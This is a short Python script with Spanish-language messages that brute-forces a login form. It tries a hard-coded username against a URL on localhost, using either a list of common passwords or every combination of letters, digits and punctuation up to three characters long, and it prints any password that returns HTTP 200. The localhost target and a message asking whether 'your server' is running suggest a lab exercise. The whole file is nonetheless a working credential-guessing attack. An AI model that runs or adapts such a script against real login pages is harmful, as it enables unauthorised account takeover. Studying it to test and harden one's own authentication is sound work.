import sys
import string
import itertools

import requests

URL = "http://127.0.0.1:8000/login"
CAMPO_USUARIO = "u"
CAMPO_PASS = "password"

USUARIOS = [
    "51066056",
]

CHARSET = string.digits + string.ascii_letters + string.punctuation
LARGO_MIN = 1
LARGO_MAX = 3

LISTA_PASS = ["1234", "admin", "password", "000", "qwerty"]


def probar(usuario, password):
    datos = {CAMPO_USUARIO: usuario, CAMPO_PASS: password}
    try:
        r = requests.post(URL, data=datos, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"[error] no me puedo conectar a {URL} -- esta levantado tu server?")
        sys.exit(1)
    return r.status_code == 200


def buscar_por_generacion(usuario):
    for largo in range(LARGO_MIN, LARGO_MAX + 1):
        for combo in itertools.product(CHARSET, repeat=largo):
            pw = "".join(combo)
            if probar(usuario, pw):
                return pw
    return None


def buscar_por_lista(usuario):
    for pw in LISTA_PASS:
        if probar(usuario, pw):
            return pw
    return None


def main(modo):
    buscar = buscar_por_lista if modo == "lista" else buscar_por_generacion
    print(f"[cliente] modo={modo}  usuarios a probar: {len(USUARIOS)}\n")

    encontrados = {}
    for usuario in USUARIOS:
        print(f"[cliente] probando usuario {usuario}...")
        pw = buscar(usuario)
        if pw is not None:
            print(f"   >>> ADIVINADA  ->  usuario: {usuario}   contrasena: {pw}")
            encontrados[usuario] = pw
        else:
            print(f"   ...no encontre contrasena para {usuario}")

    print("\n==================== RESULTADO ====================")
    if encontrados:
        for usuario, pw in encontrados.items():
            print(f"  usuario: {usuario}   contrasena: {pw}")
    else:
        print("  no se adivino ninguna contrasena")
    print("==================================================")


if __name__ == "__main__":
    modo = sys.argv[1] if len(sys.argv) > 1 else "generar"
    main(modo)
